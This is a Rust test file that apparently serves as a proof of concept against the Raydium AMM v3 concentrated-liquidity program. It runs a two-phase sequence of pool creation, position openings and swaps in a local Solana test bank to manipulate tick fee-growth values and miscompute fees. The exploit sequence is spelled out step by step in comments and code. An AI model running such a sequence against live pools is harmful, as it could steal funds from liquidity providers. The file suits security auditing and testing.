use {
    anchor_lang::prelude::*,
    raydium_amm_v3,
    solana_program_test::*,
    solana_sdk::{hash::Hash, signature::Keypair, signature::Signer, transaction::Transaction},
    std::convert::identity,
};
mod test_utils;

#[cfg(test)]
mod program_test {

    use crate::test_utils::SetUpInfo;

    use super::*;

    pub fn program_entry_wrap(
        program_id: &Pubkey,
        accounts: &[AccountInfo],
        instruction_data: &[u8],
    ) -> anchor_lang::solana_program::entrypoint::ProgramResult {
        let accounts = Box::leak(Box::new(accounts.to_vec()));
        raydium_amm_v3::entry(program_id, accounts, instruction_data)
    }

    #[derive(Default, Debug)]
    pub struct AttackInfo {
        pub base_lower: i32,
        pub base_upper: i32,
        pub tick_array_lower_start_index: i32,
        pub tick_array_upper_start_index: i32,
    }

    async fn phase1(
        setup_account: &SetUpInfo,
        wallet: &Keypair,
        payer: &Keypair,
        banks_client: &BanksClient,
        recent_blockhash: Hash,
    ) -> AttackInfo {
        // Select target ticks T_L (e.g., -100) and T_U (e.g., 100).
        // 1. Create pool at T_C = 0
        // 2. Open position at [-500, 500] at T_C = 0 as base tick range to general fee
        // 3. Perform minimal swaps to get small PoolState.fee_growth_global_X (G), T_C = -10
        // 4. Open position at [-100, 50] init T_L(-100) with O_L is PoolState.fee_growth_global_X (G) as position in range
        // 5. Perform swaps to increase global fee T_C = 150
        // 6. Open position at [100, 200] to init T_L(100) with O_L is PoolState.fee_growth_global_X (G) as position in range
        //      The O_L in T_L(100) is larger then in T_L(-100) now

        let tick_lower = test_utils::tick_with_spacing(-500, setup_account.tick_spacing.into());
        let tick_upper = test_utils::tick_with_spacing(500, setup_account.tick_spacing.into());
        let attack_info = AttackInfo {
            base_lower: tick_lower,
            base_upper: tick_upper,
            tick_array_lower_start_index:
                raydium_amm_v3::states::TickArrayState::get_array_start_index(
                    tick_lower,
                    setup_account.tick_spacing.into(),
                ),
            tick_array_upper_start_index:
                raydium_amm_v3::states::TickArrayState::get_array_start_index(
                    tick_upper,
                    setup_account.tick_spacing.into(),
                ),
        };

        // 1. Create pool at tick = 0
        let create_pool_instruction =
            test_utils::create_pool_ix(&setup_account, wallet.pubkey(), 0).unwrap();
        let mut transaction =
            Transaction::new_with_payer(&[create_pool_instruction], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet], recent_blockhash);

        let result = banks_client.process_transaction(transaction).await;
        assert!(
            result.is_ok(),
            "Transaction failed: {:?}",
            result.unwrap_err()
        );
        // 2. Open position at [-500, 500] at T_C = 0 as basic position to provides liquidity and generate fees
        let position_nft_mint = Keypair::new();
        let open_position_instruction = test_utils::open_position_ix(
            &setup_account,
            wallet.pubkey(),
            position_nft_mint.pubkey(),
            attack_info.base_lower,
            attack_info.base_upper,
            100_000_000,
        )
        .unwrap();
        let mut transaction =
            Transaction::new_with_payer(&[open_position_instruction], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet, &position_nft_mint], recent_blockhash);

        let result = banks_client.process_transaction(transaction).await;
        assert!(
            result.is_ok(),
            "Transaction failed: {:?}",
            result.unwrap_err()
        );

        let account = banks_client
            .get_account(setup_account.pool_id)
            .await
            .unwrap();
        let pool_state = raydium_amm_v3::states::PoolState::try_deserialize(
            &mut account.unwrap().data.as_slice(),
        )
        .unwrap();
        println!("T_C: {}", identity(pool_state.tick_current));

        // 3. Perform minimal swaps to get small PoolState.fee_growth_global_X (G), T_C = -10
        // T-10 <--- T0
        let swap_instruction = test_utils::swap_ix(
            &setup_account,
            wallet.pubkey(),
            1000000_000_000,
            true,
            raydium_amm_v3::libraries::get_sqrt_price_at_tick(-10).unwrap(),
            vec![
                attack_info.tick_array_upper_start_index,
                attack_info.tick_array_lower_start_index,
            ],
        )
        .unwrap();
        let mut transaction =
            Transaction::new_with_payer(&[swap_instruction], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet], recent_blockhash);

        let result = banks_client.process_transaction(transaction).await;
        assert!(
            result.is_ok(),
            "Transaction failed: {:?}",
            result.unwrap_err()
        );
        let account = banks_client
            .get_account(setup_account.pool_id)
            .await
            .unwrap();
        let pool_state = raydium_amm_v3::states::PoolState::try_deserialize(
            &mut account.unwrap().data.as_slice(),
        )
        .unwrap();
        println!("T_C: {}", identity(pool_state.tick_current));

        // 4. Open position at [-100, 50] init T_L with O_L as position in range
        let tick_lower = test_utils::tick_with_spacing(-100, setup_account.tick_spacing.into());
        let tick_upper = test_utils::tick_with_spacing(50, setup_account.tick_spacing.into());
        let position_nft_mint = Keypair::new();
        let open_position_instruction = test_utils::open_position_ix(
            &setup_account,
            wallet.pubkey(),
            position_nft_mint.pubkey(),
            tick_lower,
            tick_upper,
            100_000_000,
        )
        .unwrap();
        let mut transaction =
            Transaction::new_with_payer(&[open_position_instruction], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet, &position_nft_mint], recent_blockhash);

        let result = banks_client.process_transaction(transaction).await;
        assert!(
            result.is_ok(),
            "Transaction failed: {:?}",
            result.unwrap_err()
        );
        // 5. Perform swaps to increase global fee T_C = 150
        // T-10 -----> 150
        for i in 0..3 {
            let swap_instruction = test_utils::swap_ix(
                &setup_account,
                wallet.pubkey(),
                1000000_000_000,
                false,
                raydium_amm_v3::libraries::get_sqrt_price_at_tick(120 + i * 10).unwrap(),
                vec![
                    attack_info.tick_array_lower_start_index,
                    attack_info.tick_array_upper_start_index,
                ],
            )
            .unwrap();
            let mut transaction =
                Transaction::new_with_payer(&[swap_instruction], Some(&payer.pubkey()));
            transaction.sign(&[&payer, &wallet], recent_blockhash);

            let result = banks_client.process_transaction(transaction).await;
            assert!(
                result.is_ok(),
                "Transaction failed: {:?}",
                result.unwrap_err()
            );
            let account = banks_client
                .get_account(setup_account.pool_id)
                .await
                .unwrap();
            let pool_state = raydium_amm_v3::states::PoolState::try_deserialize(
                &mut account.unwrap().data.as_slice(),
            )
            .unwrap();
            println!("TF_C: {}", identity(pool_state.tick_current));

            let swap_instruction = test_utils::swap_ix(
                &setup_account,
                wallet.pubkey(),
                1000000_000_000,
                true,
                raydium_amm_v3::libraries::get_sqrt_price_at_tick(60 + i * 10).unwrap(),
                vec![
                    attack_info.tick_array_upper_start_index,
                    attack_info.tick_array_lower_start_index,
                ],
            )
            .unwrap();
            let mut transaction =
                Transaction::new_with_payer(&[swap_instruction], Some(&payer.pubkey()));
            transaction.sign(&[&payer, &wallet], recent_blockhash);

            let result = banks_client.process_transaction(transaction).await;
            assert!(
                result.is_ok(),
                "Transaction failed: {:?}",
                result.unwrap_err()
            );
            let account = banks_client
                .get_account(setup_account.pool_id)
                .await
                .unwrap();
            let pool_state = raydium_amm_v3::states::PoolState::try_deserialize(
                &mut account.unwrap().data.as_slice(),
            )
            .unwrap();
            println!(
                "TF_C: {}, {}",
                identity(pool_state.tick_current),
                identity(pool_state.fee_growth_global_0_x64)
            );
        }
        let swap_instruction = test_utils::swap_ix(
            &setup_account,
            wallet.pubkey(),
            1000000_000_000,
            false,
            raydium_amm_v3::libraries::get_sqrt_price_at_tick(150).unwrap(),
            vec![
                attack_info.tick_array_lower_start_index,
                attack_info.tick_array_upper_start_index,
            ],
        )
        .unwrap();
        let mut transaction =
            Transaction::new_with_payer(&[swap_instruction], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet], recent_blockhash);

        let result = banks_client.process_transaction(transaction).await;
        assert!(
            result.is_ok(),
            "Transaction failed: {:?}",
            result.unwrap_err()
        );
        let account = banks_client
            .get_account(setup_account.pool_id)
            .await
            .unwrap();
        let pool_state = raydium_amm_v3::states::PoolState::try_deserialize(
            &mut account.unwrap().data.as_slice(),
        )
        .unwrap();
        println!("T_C: {}", identity(pool_state.tick_current));

        // 6. Open position at [100, 200] to init T_L with O_L as position in range
        let tick_lower = test_utils::tick_with_spacing(100, setup_account.tick_spacing.into());
        let tick_upper = test_utils::tick_with_spacing(200, setup_account.tick_spacing.into());
        let position_nft_mint = Keypair::new();
        let open_position_instruction = test_utils::open_position_ix(
            &setup_account,
            wallet.pubkey(),
            position_nft_mint.pubkey(),
            tick_lower,
            tick_upper,
            100_000_000,
        )
        .unwrap();
        let mut transaction =
            Transaction::new_with_payer(&[open_position_instruction], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet, &position_nft_mint], recent_blockhash);

        let result = banks_client.process_transaction(transaction).await;
        assert!(
            result.is_ok(),
            "Transaction failed: {:?}",
            result.unwrap_err()
        );

        return attack_info;
    }

    async fn phase2(
        setup_account: &SetUpInfo,
        wallet: &Keypair,
        payer: &Keypair,
        banks_client: &BanksClient,
        recent_blockhash: Hash,
        attack_info: AttackInfo,
    ) {
        // phase2 process
        // 1. Open position at [-100, 100]
        // 2. Perform swaps to T_C = -150
        // 3. To calculate fee
        // 1. Open position at [-100, 100]
        let tick_lower = test_utils::tick_with_spacing(-100, setup_account.tick_spacing.into());
        let tick_upper = test_utils::tick_with_spacing(100, setup_account.tick_spacing.into());
        let position_nft_mint = Keypair::new();
        let open_position_instruction = test_utils::open_position_ix(
            &setup_account,
            wallet.pubkey(),
            position_nft_mint.pubkey(),
            tick_lower,
            tick_upper,
            100_000_000,
        )
        .unwrap();
        let mut transaction =
            Transaction::new_with_payer(&[open_position_instruction], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet, &position_nft_mint], recent_blockhash);

        let result = banks_client.process_transaction(transaction).await;
        assert!(
            result.is_ok(),
            "Transaction failed: {:?}",
            result.unwrap_err()
        );

        // 2. Perform swaps to T_C = -150
        // T-150 <----- 150
        let swap_instruction = test_utils::swap_ix(
            &setup_account,
            wallet.pubkey(),
            1000000_000_000,
            true,
            raydium_amm_v3::libraries::get_sqrt_price_at_tick(-150).unwrap(),
            vec![
                attack_info.tick_array_upper_start_index,
                attack_info.tick_array_lower_start_index,
            ],
        )
        .unwrap();
        let mut transaction =
            Transaction::new_with_payer(&[swap_instruction], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet], recent_blockhash);

        let result = banks_client.process_transaction(transaction).await;
        assert!(
            result.is_ok(),
            "Transaction failed: {:?}",
            result.unwrap_err()
        );
        let account = banks_client
            .get_account(setup_account.pool_id)
            .await
            .unwrap();
        let pool_state = raydium_amm_v3::states::PoolState::try_deserialize(
            &mut account.unwrap().data.as_slice(),
        )
        .unwrap();
        println!(
            "T_C: {}, {}",
            identity(pool_state.tick_current),
            identity(pool_state.fee_growth_global_0_x64)
        );
    }

    #[tokio::test]
    async fn test_program() {
        // Phase1: Select target ticks T_L (e.g., -100) and T_U (e.g., 100).
        // 1. Create pool at T_C = 0
        // 2. Open position at [-500, 500] at T_C = 0 as base tick range to general fee
        // 3. Perform minimal swaps to get small PoolState.fee_growth_global_X (G), T_C = -10
        // 4. Open position at [-100, 50] init T_L(-100) with O_L is PoolState.fee_growth_global_X (G) as position in range
        // 5. Perform swaps to increase global fee T_C = 150
        // 6. Open position at [100, 200] to init T_L(100) with O_L is PoolState.fee_growth_global_X (G) as position in range
        //      The O_L in T_L(100) is larger then in T_L(-100) now
        // phase2 process
        // 1. Open position at [-100, 100]
        // 2. Perform swaps to T_C = -150
        // 3. To calculate fee

        let wallet = Keypair::new();
        let mut program_test = ProgramTest::new(
            "raydium_amm_v3",
            raydium_amm_v3::id(),
            processor!(program_entry_wrap),
        );

        let setup_account = test_utils::setup(&mut program_test, &wallet.pubkey(), 10, 10000);
        let (banks_client, payer, recent_blockhash) = program_test.start().await;

        // Phase1 process
        let attack_info = phase1(
            &setup_account,
            &wallet,
            &payer,
            &banks_client,
            recent_blockhash,
        )
        .await;

        // Phase2 process
        phase2(
            &setup_account,
            &wallet,
            &payer,
            &banks_client,
            recent_blockhash,
            attack_info,
        )
        .await;
    }
}
